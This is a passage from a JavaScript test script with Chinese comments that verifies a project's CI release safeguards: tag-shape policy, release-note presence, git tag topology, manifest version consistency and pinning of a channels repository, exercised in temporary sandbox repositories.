    check(text.includes('v 前缀') || text.includes('含版本号'), `失败信息必须点名问题(v 前缀),实际: ${text.slice(0, 160)}`)
    check(text.includes('::error::'), '失败必须打 ::error::(CI 注解可见)')
    // 公开日志纪律:失败信息不回显 tag 名。
    check(!text.includes(name), 'tag 形态失败信息不得回显 tag 名')
  }
  // 反向自证:合法的发布 tag 与**显式登记过的无关 tag**不被这条判据误伤
  // (否则"宁可多拦"会变成"发版发不出去")。
  for (const [ref, name, kind] of [
    ['refs/tags/v2.8.2-beta.1', 'v2.8.2-beta.1', 'prerelease'],
    ['refs/tags/v2.8.2', 'v2.8.2', 'stable'],
    ['refs/tags/docs-snapshot', 'docs-snapshot', 'none'],
  ]) {
    const result = policy(ref, name)
    check(result.status === 0, `${ref} 应放行,实际 ${String(result.status)}: ${(result.stderr ?? '').slice(0, 160)}`)
    check(fields(result.stdout ?? '').release_kind === kind, `${ref}: release_kind 应为 ${kind}`)
  }
  // 同名但**不是 tag**(分支/PR)不得被这条判据拦 —— 否则一个叫 `2.8.2` 的分支
  // 会让所有人的 PR 红(release 判据只能管 tag)。
  {
    const branch = policy('refs/heads/2.8.2-beta.1', '2.8.2-beta.1')
    check(branch.status === 0, '名字像版本号的分支必须放行(只发 official、不发布),不能被发布判据拦下')
    const pull = policy('refs/pull/42/merge', '42/merge')
    check(pull.status === 0, 'PR ref 必须放行')
  }

  // 静态对拍:三处都只读那一份实现,不留第二份名字形状判断。
  {
    const workflow = readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8')
    const lines = workflow.split(/\r?\n/u)
    const start = lines.findIndex(line => line === '  release:')
    check(start >= 0, '未找到 ci.yml 的 release job(扫描器可能已失效)')
    let end = lines.length
    for (let index = start + 1; index < lines.length; index += 1) {
      if (/^ {2}[A-Za-z0-9_-]+:\s*$/u.test(lines[index])) { end = index; break }
    }
    const releaseJob = start < 0 ? '' : lines.slice(start, end).join('\n')
    check(
      /^ {4}if: startsWith\(github\.ref, 'refs\/tags\/v'\)$/mu.test(releaseJob),
      'release job 的 if: 只应判"是不是 v 开头的 tag"(形态判定属于 ci-release-policy.sh)',
    )
    // **只禁"用 tag 名形状判形态"**,不是禁用 github.ref_name 本身:
    // `VERSION: ${{ github.ref_name }}` / `TAG="${GITHUB_REF_NAME}"` 这类**取值**位是
    // 合法的(它就是把 tag 名当版本号用);被禁的是 `if:` 条件里的
    // `contains(github.ref_name, '-beta')` / `!contains(github.ref_name, '-')` 这类名字
    // 形状判断 —— 那正是 K-04 的第二份实现(未知后缀会"全渠道构建 + 零发布")。
    const shapeHits = tagShapePredicates(releaseJob)
    check(
      shapeHits.length === 0,
      `release job 的 if: 不得用 github.ref_name 判 tag 形态(应只读 ci-release-policy.sh),实际命中 ${JSON.stringify(shapeHits)}`,
    )
    // 正例自证:取值位仍在使用,且不因上一条被判违规(否则这条断言会把合法写法一起打红)。
    check(
      releaseJob.includes('${{ github.ref_name }}'),
      'release job 应仍把 tag 名作为版本号传入(VERSION: ${{ github.ref_name }});若确实改了,请同步本条正例',
    )
    // 反例自证:把形态判定写回 job 级 `if:` 时必须被判违规 —— 证明上一条断言有判别力
    // (而不是"怎么改都绿")。
    const mutatedJob = releaseJob.replace(
      /^ {4}if: .*$/mu,
      "    if: startsWith(github.ref, 'refs/tags/v') && !contains(github.ref_name, '-')",
    )
    check(
      mutatedJob !== releaseJob && tagShapePredicates(mutatedJob).length > 0,
      '反例自证失败:把 tag 形态判定写回 release job 的 if: 时,断言必须报红',
    )
    const policyIndex = workflow.indexOf('scripts/ci-release-policy.sh')
    const notesIndex = workflow.indexOf("steps.release_policy.outputs.release_kind != 'none'")
    check(policyIndex >= 0, 'gate 必须执行 scripts/ci-release-policy.sh(未知形态要早失败)')
    check(
      notesIndex >= 0,
      '发布说明检查必须读 release_policy 步骤的输出,且对**发布 tag 一律要求**(条件 `!= \'none\'`)'
      + ' —— R5-C-3:只认 stable 会让预发 tag 缺说明时回退自动变更日志',
    )
    check(
      policyIndex >= 0 && notesIndex >= 0 && policyIndex < notesIndex,
      '策略步骤必须在发布说明检查之前(它提供该检查依赖的输出)',
    )
    // 反例自证:`== 'stable'` 的精简写法必须被判红(证明上面那条断言有判别力)。
    check(
      !/steps\.release_policy\.outputs\.release_kind\s*==\s*'stable'/u.test(workflow),
      'gate 的发布说明检查不得退回"只认正式版"的条件(预发 tag 同样必须有策展说明)',
    )

    const channelsText = readFileSync(channelsScript, 'utf8')
    check(channelsText.includes('ci-release-policy.sh'), 'ci-channels.sh 必须调用唯一真源 ci-release-policy.sh')
    check(
      !channelsText.includes('*-beta.*') && !channelsText.includes('v[0-9]*.[0-9]*.[0-9]*'),
      'ci-channels.sh 不得保留第二份 tag 形态 glob(必须只读 ci-release-policy.sh)',
    )
  }
}

// ---- 1c. 策展发布说明的两道检查:真跑 ci.yml 里的 shell(2026-09-23 审计 C-CI-2) ----
//
// 现场:唯一会拦"正式 tag 缺 docs/releases/<tag>.md"的地方在 `Create GitHub Release`
// 步骤里,而它排在 `Upload every channel image to the update server (R2)` **之后** ——
// 客户侧更新面(不可变长缓存)已经先被挂上新版本,才轮到 GitHub Release 红 = 半发布。
// 现在有两道:gate 的早检(1 分钟内红,下游全部因 needs 跳过)与 release job 的
// "任何对外上传之前"那道。两者都是 ci.yml 里的 shell,所以这里**抽出真块真跑**:
// 少了任何一道、或者判据被改成恒成功,这一组就红。
{
  const workflowText = readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8')
  const blocks = extractRunBlocks(workflowText)
  const notesNeedle = 'test -f "docs/releases/${GITHUB_REF_NAME}.md"'
  const earlyCheck = blocks.find(block => block.content.includes(notesNeedle) && !block.content.includes('release-policy.txt'))
  const preUploadCheck = blocks.find(block => block.content.includes(notesNeedle) && block.content.includes('release-policy.txt'))
  check(earlyCheck !== undefined, 'ci.yml 里找不到 gate 的策展说明早检(抽取失败或整步被删)')
  check(preUploadCheck !== undefined, 'ci.yml 里找不到 release job 的"上传前"策展说明检查')

  /** 造一个最小检出:scripts/ci-release-policy.sh + docs/releases/<可选文件>。 */
  const sandbox = ({ releaseNotes }) => {
    const dir = tempDir('ci-notes-')
    mkdirSync(join(dir, 'scripts'), { recursive: true })
    mkdirSync(join(dir, 'docs', 'releases'), { recursive: true })
    writeFileSync(join(dir, 'scripts', 'ci-release-policy.sh'), readFileSync(releasePolicyScript))
    if (releaseNotes !== null) writeFileSync(join(dir, 'docs', 'releases', `${releaseNotes}.md`), '# notes\n')
    return dir
  }
  const runBlock = (dir, content, ref, refName) => spawnSync('bash', ['-c', content], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, GITHUB_REF: ref, GITHUB_REF_NAME: refName, GITHUB_OUTPUT: join(dir, 'out.txt') },
  })

  if (earlyCheck !== undefined && preUploadCheck !== undefined) {
    // 正式 tag:缺文件必须 fail-loud(两道都要)。
    const missing = sandbox({ releaseNotes: null })
    const earlyMissing = runBlock(missing, earlyCheck.content, 'refs/tags/v9.9.9', 'v9.9.9')
    check(earlyMissing.status !== 0, `gate 的早检在缺 docs/releases/<tag>.md 时必须失败,实际退出 ${String(earlyMissing.status)}`)
    check(`${earlyMissing.stdout ?? ''}${earlyMissing.stderr ?? ''}`.includes('::error::'),
      'gate 早检失败时要打 ::error::(CI 注解)')
    const preMissing = runBlock(missing, preUploadCheck.content, 'refs/tags/v9.9.9', 'v9.9.9')
    check(preMissing.status !== 0, `release job 的"上传前"检查在缺文件时必须失败,实际退出 ${String(preMissing.status)}`)
    check(`${preMissing.stdout ?? ''}${preMissing.stderr ?? ''}`.includes('::error::'),
      'release job 的上传前检查失败时要打 ::error::')

    // 正式 tag + 文件在:必须放行(否则正当发版会被自己拦下)。
    const present = sandbox({ releaseNotes: 'v9.9.9' })
    const prePresent = runBlock(present, preUploadCheck.content, 'refs/tags/v9.9.9', 'v9.9.9')
    check(prePresent.status === 0, `release job 的上传前检查在文件存在时应放行,实际退出 ${String(prePresent.status)}: ${(prePresent.stderr ?? '').slice(0, 200)}`)
    const earlyPresent = runBlock(present, earlyCheck.content, 'refs/tags/v9.9.9', 'v9.9.9')
    check(earlyPresent.status === 0, `gate 早检在文件存在时应放行,实际退出 ${String(earlyPresent.status)}`)

    // 预发 tag:**同样必须**有策展说明(2026-09-23 第五轮审计 R5-C-3)。
    //
    // 现场:两处检查都以 `release_kind=stable` 为前提,预发 tag 缺说明被放行到
    // `--generate-notes` —— 自动变更日志的正文由提交信息 + **PR 标题/正文**生成,而后者
    // 不是文件、不在任何守卫判据内(铁律 0 的盲区);历史上正是这条路径把真实域名/IP
    // 带进了公开 Release 正文。判据:预发 tag 缺说明时,gate 早检与上传前检查都必须红;
    // 文件在时必须放行(否则正当发版会被自己拦下)。
    const prereleaseMissing = sandbox({ releaseNotes: null })
    for (const [label, block] of [['gate 早检', earlyCheck], ['上传前检查', preUploadCheck]]) {
      const result = runBlock(prereleaseMissing, block.content, 'refs/tags/v9.9.9-beta.1', 'v9.9.9-beta.1')
      check(result.status !== 0, `预发 tag 缺策展说明时${label}必须失败,实际退出 ${String(result.status)}`)
      check(
        `${result.stdout ?? ''}${result.stderr ?? ''}`.includes('::error::'),
        `预发 tag 缺说明的${label}失败信息要打 ::error::`,
      )
    }
    const prereleasePresent = sandbox({ releaseNotes: 'v9.9.9-beta.1' })
    const prePrereleasePresent = runBlock(prereleasePresent, preUploadCheck.content, 'refs/tags/v9.9.9-beta.1', 'v9.9.9-beta.1')
    check(
      prePrereleasePresent.status === 0,
      `预发 tag 有策展说明时必须放行,实际退出 ${String(prePrereleasePresent.status)}: ${(prePrereleasePresent.stderr ?? '').slice(0, 200)}`,
    )
    const earlyPrereleasePresent = runBlock(prereleasePresent, earlyCheck.content, 'refs/tags/v9.9.9-beta.1', 'v9.9.9-beta.1')
    check(earlyPrereleasePresent.status === 0, `gate 早检在预发 tag + 文件存在时应放行,实际退出 ${String(earlyPrereleasePresent.status)}`)

    // 未知 tag 形态:唯一真源当场红,这一步也必须跟着红(不许"上传了才知道名字不认识")。
    const unknown = sandbox({ releaseNotes: 'v9.9.9-hotfix' })
    const preUnknown = runBlock(unknown, preUploadCheck.content, 'refs/tags/v9.9.9-hotfix', 'v9.9.9-hotfix')
    check(preUnknown.status !== 0, '未知 tag 形态必须在"上传前"检查里失败(唯一真源已 fail-loud)')
  }
}

// ---- 1e. 发布 tag 的拓扑判据(2026-09-23 第五轮审计 R5-C-2 / M1) ----
//
// 现场:全仓没有 `git merge-base --is-ancestor` 类判据。2026-09-17 的真实事故里,上一个
// tag 打在**旁支**上,发版人直接从功能分支打新 tag ⇒ 那条旁支上的修复被静默丢掉,而
// CI 全绿。这一组用**合成 git 仓库**真跑 `scripts/ci-release-topology.sh`:
//   ① 基线是祖先 ⇒ 绿;② 基线在旁支 ⇒ 红且打印两侧;③ `--exclude-tag` 能把"本次要发的
//   tag"排除(支持先本地自检、再打 tag);④ 主线判据(不在主线 ⇒ 红);⑤ 判据跑不成
//   (无发布 tag / 基线解析不出 / 主线 ref 解析不出)⇒ 退出 2,**不是** 0。
{
  const topologyScript = join(root, 'scripts', 'ci-release-topology.sh')
  check(existsSync(topologyScript), 'scripts/ci-release-topology.sh 必须存在(拓扑判据的唯一实现)')

  // 合成仓库工具见模块级 `fixtureRepo` / `fixtureCommit` / `fixtureTag`(与 1g 共用)。
  const newRepo = fixtureRepo
  const commit = fixtureCommit
  const tag = fixtureTag
  const runTopology = (dir, args) => spawnSync('bash', [topologyScript, ...args], {
    cwd: dir,
    encoding: 'utf8',
    // HOME 指向合成仓库:宿主 ~/.gitconfig(可能带签名/模板)不得影响判据。
    env: { ...gitFixtureEnv, HOME: dir },
  })

  // ① 基线是祖先 ⇒ 绿。
  {
    const dir = newRepo()
    commit(dir, 'a.txt', 'base', '2026-09-01T10:00:00+08:00')
    tag(dir, 'v2.8.1', '2026-09-01T10:01:00+08:00')
    commit(dir, 'b.txt', 'next', '2026-09-02T10:00:00+08:00')
    const ok = runTopology(dir, ['--ref', 'HEAD', '--no-mainline'])
    check(ok.status === 0, `拓扑正例(基线是祖先)应绿,实际 ${String(ok.status)}: ${ok.stderr}`)
    check((ok.stdout ?? '').includes('v2.8.1'), '成功输出应点名基线 tag(发版日志要能核对)')
  }

  // ② 基线在旁支 ⇒ 红,且必须打印两侧(2026-09-17 事故的形态)。
  {
    const dir = newRepo()
    commit(dir, 'a.txt', 'base', '2026-09-01T10:00:00+08:00')
    tag(dir, 'v2.8.1', '2026-09-01T10:01:00+08:00')
    commit(dir, 'b.txt', 'main-next', '2026-09-02T10:00:00+08:00')
    fixtureMustGit(dir, ['checkout', '-q', '-b', 'side', 'HEAD~1'])
    commit(dir, 'side.txt', 'side-fix', '2026-09-03T10:00:00+08:00')
    tag(dir, 'v2.8.2-beta.1', '2026-09-03T10:01:00+08:00')
    fixtureMustGit(dir, ['checkout', '-q', 'master'])
    const bad = runTopology(dir, ['--ref', 'HEAD', '--no-mainline'])
    check(bad.status === 1, `旁支基线必须红(退出 1),实际 ${String(bad.status)}: ${bad.stderr}`)
    const text = `${bad.stderr ?? ''}`
    check(text.includes('v2.8.2-beta.1'), '失败必须点名旁支上的基线 tag(打印两侧)')
    check(text.includes('旁支'), '失败必须说清"两侧都非零 = 旁支"')
    check(text.includes('::error::'), '失败必须打 ::error::(CI 注解可见)')
    // ③ `--exclude-tag`:本次要发的 tag 不参与基线候选 ⇒ 回到 v2.8.1 ⇒ 绿。
    const excluded = runTopology(dir, ['--ref', 'HEAD', '--exclude-tag', 'v2.8.2-beta.1', '--no-mainline'])
    check(
      excluded.status === 0,
      `排除本次要发的 tag 后应绿(CI 用法:--exclude-tag),实际 ${String(excluded.status)}: ${excluded.stderr}`,
    )
    // ④ 主线判据:旁支 tag 不在 master 上 ⇒ 红。
    const offMain = runTopology(dir, ['--ref', 'v2.8.2-beta.1', '--exclude-tag', 'v2.8.1', '--mainline', 'master'])
    check(offMain.status === 1, `不在主线的 tag 必须红,实际 ${String(offMain.status)}: ${offMain.stderr}`)
    check(`${offMain.stderr ?? ''}`.includes('主线'), '主线违规的失败信息必须点名"主线"')
    // 正向对照:主线上、基线是祖先 ⇒ 绿(证明判据不是恒红)。
    const onMain = runTopology(dir, ['--ref', 'master', '--base', 'v2.8.1', '--mainline', 'master'])
    check(onMain.status === 0, `主线上的正例应绿,实际 ${String(onMain.status)}: ${onMain.stderr}`)
  }

  // ⑤ "判据没跑成"必须退出 2,不许伪装成通过。
  {
    const dir = newRepo()
    commit(dir, 'a.txt', 'base', '2026-09-01T10:00:00+08:00')
    const noTags = runTopology(dir, ['--ref', 'HEAD', '--no-mainline'])
    check(noTags.status === 2, `没有任何发布 tag 时必须退出 2(判据未完成 ≠ 通过),实际 ${String(noTags.status)}`)
    check(`${noTags.stderr ?? ''}`.includes('无法执行'), '未完成时的信息要说清"判据无法执行"')
    const missingBase = runTopology(dir, ['--ref', 'HEAD', '--base', 'v9.9.9', '--no-mainline'])
    check(missingBase.status === 2, `基线解析不出时必须退出 2,实际 ${String(missingBase.status)}`)
    const missingMainline = runTopology(dir, ['--ref', 'HEAD', '--mainline', 'origin/does-not-exist'])
    check(missingMainline.status === 2, `主线 ref 解析不出时必须退出 2,实际 ${String(missingMainline.status)}`)
    const badUsage = runTopology(dir, ['--nope'])
    check(badUsage.status === 2, `未知参数必须退出 2,实际 ${String(badUsage.status)}`)
  }

  // ⑥ 接线判据:gate 必须真的跑它(不是"有能力、没接线"),且只能在发布 tag 上跑,
  //    并且早于全量门禁步(拓扑违规要在 1 分钟内红,不等 40 分钟构建)。
  {
    const workflow = parseYaml(readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8'))
    const gateSteps = workflow?.jobs?.gate?.steps ?? []
    const topologyIndex = gateSteps.findIndex(step => typeof step?.run === 'string' && step.run.includes('ci-release-topology.sh'))
    check(topologyIndex >= 0, 'ci.yml 的 gate 必须执行 scripts/ci-release-topology.sh(否则拓扑判据形同不存在)')
    if (topologyIndex >= 0) {
      const step = gateSteps[topologyIndex]
      check(
        typeof step.if === 'string' && step.if.includes('refs/tags/v'),
        '拓扑判据只能在发布 tag 上跑(非 tag 的 PR/分支没有"上一个 tag"语义)',
      )
      check(
        typeof step.run === 'string' && step.run.includes('--exclude-tag'),
        '拓扑判据必须把本次要发的 tag 从基线候选里排除(--exclude-tag)',
      )
      check(
        typeof step.run === 'string' && step.run.includes('git fetch'),
        '拓扑判据步骤必须显式补齐判据输入(主线 ref + 全部 tag),不能依赖 checkout 恰好带了什么'
        + ' —— 输入缺失时脚本退出 2,发布会被自己拦下',
      )
    }
    const gateIndex = gateSteps.findIndex(step => typeof step?.run === 'string' && /(?:^|\s)yarn\s+check(?![\w:-])/u.test(step.run))
    check(gateIndex >= 0, 'ci.yml 的 gate 里找不到全量门禁步(扫描器可能已失效)')
    check(
      topologyIndex >= 0 && gateIndex >= 0 && topologyIndex < gateIndex,
      '拓扑判据必须早于全量门禁步(1 分钟内报错,不等三平台构建)',
    )
  }
}

// ---- 1f. 版本一致性谓词(2026-09-23 第五轮审计 R5-C-5) ----
//
// 现场:两处 package.json 的版本一致性**只在 release job 第 4 步**校验(四平台构建 40 分钟
// 之后),分支/PR 侧零判据;而 `version.mjs check`(期望值取 git describe 的最新 tag)在
// "发布 PR 已 bump、tag 未打"的分支上**必红** ⇒ 不能直接塞进 gate。
// 修法两半:① 新增 `manifests`(只比两处相等,与 tag 无关)—— 它能进 gate;② tag push 上
// 再跑 `check "$GITHUB_REF_NAME"`。这一组在**合成检出**里真跑两条判据,并静态钉住接线。
{
  const versionScript = join(root, 'scripts', 'version.mjs')
  check(existsSync(versionScript), 'scripts/version.mjs 必须存在(版本唯一权威源)')

  /** 合成检出:scripts/version.mjs + 两处 package.json。 */
  const sandbox = ({ rootVersion, desktopVersion }) => {
    const dir = tempDir('ci-version-')
    mkdirSync(join(dir, 'scripts'), { recursive: true })
    mkdirSync(join(dir, 'packages', 'host', 'desktop'), { recursive: true })
    writeFileSync(join(dir, 'scripts', 'version.mjs'), readFileSync(versionScript))
    writeFileSync(join(dir, 'package.json'), `${JSON.stringify({ name: 'root', version: rootVersion }, null, 2)}\n`)
    writeFileSync(
      join(dir, 'packages', 'host', 'desktop', 'package.json'),
      `${JSON.stringify({ name: 'desktop', version: desktopVersion }, null, 2)}\n`,
    )
    return dir
  }
  const runVersion = (dir, args) => spawnSync('node', ['scripts/version.mjs', ...args], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, HOME: dir },
  })

  // ① `manifests`:只比两处相等 —— 发布 PR"已 bump、tag 未打"的状态必须绿。
  const bumped = sandbox({ rootVersion: '9.9.9', desktopVersion: '9.9.9' })
  const manifestsGreen = runVersion(bumped, ['manifests'])
  check(
    manifestsGreen.status === 0,
    `两处 manifest 相等时 manifests 必须绿(发布 PR 的常态),实际 ${String(manifestsGreen.status)}: ${manifestsGreen.stderr}`,
  )
  check((manifestsGreen.stdout ?? '').includes('9.9.9'), 'manifests 成功输出应带版本号(便于日志核对)')
  // ② 只改一处:必须红,且点名两处取值(这是"漏改一处"的 1 分钟判据)。
  const skewed = sandbox({ rootVersion: '9.9.9', desktopVersion: '9.9.8' })
  const manifestsRed = runVersion(skewed, ['manifests'])
  check(manifestsRed.status !== 0, `两处 manifest 不等时 manifests 必须红,实际 ${String(manifestsRed.status)}`)
  const skewText = `${manifestsRed.stderr ?? ''}`
  check(skewText.includes('9.9.9') && skewText.includes('9.9.8'), '不一致的失败信息必须点名两处取值')
  // ③ tag 与两处 manifest 逐字一致 ⇒ 绿;不一致 ⇒ 红。
  const taggedGreen = runVersion(bumped, ['check', 'v9.9.9'])
  check(taggedGreen.status === 0, `tag 与 manifest 一致时应绿,实际 ${String(taggedGreen.status)}: ${taggedGreen.stderr}`)
  const taggedRed = runVersion(bumped, ['check', 'v9.9.8'])
  check(taggedRed.status !== 0, 'tag 与 manifest 不一致时必须红')
  check(`${taggedRed.stderr ?? ''}`.includes('期望'), '不一致的失败信息必须给出期望值(点名)')
  // ④ 显式 tag 漏 `v`:必须红(与 ci-release-policy.sh 同一口径,R5-C-1)。
  const noPrefix = runVersion(bumped, ['check', '9.9.9'])
  check(noPrefix.status !== 0, '显式 tag 漏 v 前缀时必须红(漏 v 的 tag 不是发布 tag)')
  check(`${noPrefix.stderr ?? ''}`.includes('v 开头'), '漏 v 的失败信息必须点名"必须以 v 开头"')
  // ⑤ `set` 收到无 v 前缀的输入:仍写入(不打断既有用法),但**必须出声**。
  const setBare = runVersion(bumped, ['set', '9.9.10'])
  check(setBare.status === 0, `set 9.9.10 应成功,实际 ${String(setBare.status)}: ${setBare.stderr}`)
  check(
    `${setBare.stderr ?? ''}`.includes('v 前缀') || `${setBare.stderr ?? ''}`.includes('git tag 必须带 v'),
    'set 收到无 v 前缀输入时必须打警告(漏 v 的 tag 会静默零发布)',
  )
  check(
    JSON.parse(readFileSync(join(bumped, 'package.json'), 'utf8')).version === '9.9.10',
    'set 必须把去 v 的版本写进 manifest',
  )
  const setTagged = runVersion(bumped, ['set', 'v9.9.11'])
  check(setTagged.status === 0, `set v9.9.11 应成功,实际 ${String(setTagged.status)}: ${setTagged.stderr}`)
  check(!`${setTagged.stderr ?? ''}`.includes('v 前缀'), '带 v 前缀的 set 不应打警告(否则警告会被无视)')

  // ⑥ 接线:gate 必须真的跑这两条(不是"有能力、没接线"),且 tag 判据只在 tag 上跑。
  {
    const workflow = parseYaml(readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8'))
    const gateSteps = workflow?.jobs?.gate?.steps ?? []
    const manifestsIndex = gateSteps.findIndex(step => typeof step?.run === 'string' && step.run.includes('version.mjs manifests'))
    check(manifestsIndex >= 0, 'ci.yml 的 gate 必须跑 `node scripts/version.mjs manifests`(漏改一处的 1 分钟判据)')
    const checkIndex = gateSteps.findIndex(step => typeof step?.run === 'string' && step.run.includes('version.mjs check'))
    check(checkIndex >= 0, 'ci.yml 的 gate 必须在 tag push 上跑 `node scripts/version.mjs check "$GITHUB_REF_NAME"`')
    if (checkIndex >= 0) {
      const step = gateSteps[checkIndex]
      check(
        typeof step.run === 'string' && step.run.includes('refs/tags/v') && step.run.includes('${GITHUB_REF_NAME}'),
        'tag 版本判据必须按 ref 类型守卫并传 tag 名(不能无条件跑:发布 PR 未打 tag 时 check 必红)',
      )
    }
    // release job 的那道保留(第二道),且两条判据必须共用同一个脚本(唯一真源)。
    const releaseSteps = workflow?.jobs?.release?.steps ?? []
    check(
      releaseSteps.some(step => typeof step?.run === 'string' && step.run.includes('version.mjs check')),
      'release job 必须保留 `version.mjs check`(发布前对 tag 的第二道判据)',
    )
  }
}

// ---- 1g. 渠道仓 revision:一处解析、多 job 复用(2026-09-23 第五轮审计 R5-C-2) ----
//
// 现场:私有渠道仓在同一次 tag 里被四个 job 各自 `git clone --depth 1 origin/main`
// (三平台 + release),四次克隆相差数十分钟、不 pin、不记录、无跨 job 比对 ⇒ 镜像里的
// 渠道内容(晚克隆)与随包客户端(早克隆)可能不同源,同一个源码 tag 也无法复现同一份
// 交付物(项目已有同形事故:预发线数据根被改,升级后"所有对话消失")。
//
// 这一组在**合成 git 仓库**里真跑 `ci-channels.sh --pin`,判据是行为而不是文本:
//   ① `--resolve-only` 打印唯一一行 `channels_rev=<HEAD sha>`;
//   ② `--pin <旧提交>` 取到的是**那个旧提交**的内容(新提交里加的渠道不出现)——
//      这正是"包内客户端与镜像内容同源"的机器判据;
//   ③ 不 pin 时取的是默认分支 HEAD(证明 pin 确实改变了行为,而不是恒等);
//   ④ 发布 tag 上缺 pin 必须 fail-loud(不静默退回"各自 clone HEAD");
//   ⑤ pin 形状非法 / pin 不存在都必须失败,且**不回显取值**;
//   ⑥ 静态接线:gate 声明并解析 `channels_rev`,四处调用点都带同一个 pin 来源,
//      release job 必须**直接** needs gate(`needs` 上下文只含直接依赖)。
{
  const policyFields = stdout => Object.fromEntries(
    (stdout ?? '').split('\n').filter(Boolean)
      .filter(line => line.includes('='))
      .map(line => [line.slice(0, line.indexOf('=')), line.slice(line.indexOf('=') + 1)]),
  )

  // 合成渠道仓:提交 1 = official + 两个品牌渠道(目录数已达 R8-C-7 的下限 —— 夹具必须与
  // 真实渠道仓同形,否则这条用例会被"渠道目录数少于下限"先拦住);提交 2 增加 beta
  // (内容差异可观测:pin 到提交 1 时渠道集里没有 beta)。
  const repo = fixtureRepo()
  const writeFixtureChannel = (id, file) => {
    mkdirSync(join(repo, 'channels', id), { recursive: true })
    const publicChannel = id === 'official' || id === 'beta'
    writeFileSync(join(repo, 'channels', id, 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: id,
      identity: { display_name: `${id} AI`, short_name: id },
      desktop: publicChannel
        ? { app_origin_scheme: 'picoaide-app', ...(id === 'beta' ? { home_dir: '.picoaide-harness' } : {}) }
        : {
            product_name: `${id} AI`,
            slug: `${id}-AI`,
            app_id: `com.example.${id.replaceAll('-', '')}`,
            deep_link_scheme: `${id.replaceAll('-', '')}link`,
            home_dir: `.${id}-harness`,
            app_origin_scheme: `${id.replaceAll('-', '')}-app`,
          },
    }))
    fixtureCommit(repo, file, `add ${id}`, '2026-09-01T10:00:00+08:00')
  }
  const firstRevIds = []
  for (const id of ['official', 'example-brand', 'example-ops', 'zeta']) {
    writeFixtureChannel(id, `channels/${id}/README.md`)
    firstRevIds.push(id)
  }
  // 提交 1 的渠道集按脚本定序规则(official 置顶 + 其余字典序)算,供 pin 判据对拍。
  const firstExpected = orderedChannelIds(repo)
  check(
    firstExpected.length >= channelFloor(),
    `合成仓库提交 1 的渠道目录数(${firstExpected.length})必须 ≥ 下限(${channelFloor()}),否则 pin 用例会被下限拦住`,
  )
  const firstRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
  writeFixtureChannel('beta', 'channels/beta/README.md')
  const headRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
  check(firstRev !== headRev, '合成仓库必须有两个不同提交(否则 pin 判据没有判别力)')
  check(
    !firstExpected.includes('beta') && channelIdsOf(repo).includes('beta'),
    '夹具前置:beta 必须只在提交 2 里(否则"pin 到旧提交"没有判别力)',
  )
  const url = `file://${repo}`

  const runPinned = (extraEnv, args = []) => runChannels({
    source: undefined,
    refName: 'v9.9.9',
    ref: 'refs/tags/v9.9.9',
    dest: 'channels',
    list: 'pin.list',
    env: { CI_CHANNELS_URL: url, ...extraEnv },
    args,
  })

  // ① `--resolve-only`:stdout 恰好一行 `channels_rev=<sha>`,且等于默认分支 HEAD。
  {
    const resolved = runChannels({
      source: undefined,
      refName: 'v9.9.9',
      ref: 'refs/tags/v9.9.9',
      dest: 'channels',
      list: 'rev.list',
      env: { CI_CHANNELS_URL: url },
      args: ['--resolve-only'],
    })
    check(resolved.status === 0, `--resolve-only 应成功,实际 ${String(resolved.status)}: ${resolved.stderr}`)
    const lines = (resolved.stdout ?? '').split('\n').filter(Boolean)
    check(lines.length === 1 && lines[0] === `channels_rev=${headRev}`,
      `--resolve-only 的 stdout 必须恰好一行 channels_rev=<HEAD sha>(供 >> \"$GITHUB_OUTPUT\"),实际 ${JSON.stringify(lines)}`)
  }

  // ② pin 到旧提交 ⇒ 取到旧内容(beta 不存在);③ 不 pin ⇒ 取 HEAD(两个渠道都在)。
  {
    const pinned = runPinned({ CI_CHANNELS_PIN: firstRev })
    check(pinned.status === 0, `pin 取旧提交应成功,实际 ${String(pinned.status)}: ${pinned.stderr}`)
    check(
      JSON.stringify(pinned.selected) === JSON.stringify(firstExpected),
      `pin 到旧提交时渠道集必须等于**旧提交**里的目录集(证明取到的是 pinned 内容,不是 HEAD),期望 ${JSON.stringify(firstExpected)},实际 ${JSON.stringify(pinned.selected)}`,
    )
    check((pinned.stdout ?? '').includes(`pinned at ${firstRev}`), 'pinned 路径必须打印解析出的 revision(可审计)')
    const unpinned = runChannels({
      source: undefined,
      refName: 'release-branch',
      ref: 'refs/heads/release-branch',
      dest: 'channels',
      list: 'nopin.list',
      env: { CI_CHANNELS_URL: url },
    })
    check(unpinned.status === 0, `非 tag 上不 pin 应成功,实际 ${String(unpinned.status)}: ${unpinned.stderr}`)
    check(
      JSON.stringify(unpinned.selected) === JSON.stringify(['official']),
      '非 tag 上只发 official(渠道集判据不变)',
    )
    check((unpinned.stdout ?? '').includes(`revision ${headRev}`),
      '不 pin 的路径必须打印实际取到的 revision(证明 pin 确实改变了行为)')
  }

  // ④ 发布 tag 上缺 pin:必须失败(不静默退回"各自 clone origin/main HEAD")。
  {
    const missing = runChannels({
      source: undefined,
      refName: 'v9.9.9',
      ref: 'refs/tags/v9.9.9',
      dest: 'channels',
      list: 'nopin-tag.list',
      env: { CI_CHANNELS_URL: url },
    })
    check(missing.status !== 0, '发布 tag 上缺渠道仓 pin 必须 fail-loud(否则四处克隆可能不同源)')
    check(`${missing.stderr ?? ''}`.includes('pin'), '缺 pin 的失败信息必须点名 pin')
  }

  // ⑤ pin 形状非法 / pin 在仓库里不存在:失败且不回显取值。
  {
    const bogus = 'zzzz-not-a-sha'
    const badShape = runPinned({ CI_CHANNELS_PIN: bogus })
    check(badShape.status !== 0, 'pin 形状非法时必须失败')
    check(!`${badShape.stderr ?? ''}${badShape.stdout ?? ''}`.includes(bogus), 'pin 形状失败的输出不得回显取值')
    const absent = 'f'.repeat(40)
    const notFound = runPinned({ CI_CHANNELS_PIN: absent })
    check(notFound.status !== 0, 'pin 指向仓库里不存在的提交时必须失败(不得退回 HEAD)')
    check(!`${notFound.stderr ?? ''}`.includes(absent), 'pin 取回失败的输出不得回显取值')
  }

  // ⑥ 静态接线:一处解析 + 四 job 共用 + release 直接依赖 gate。
  {
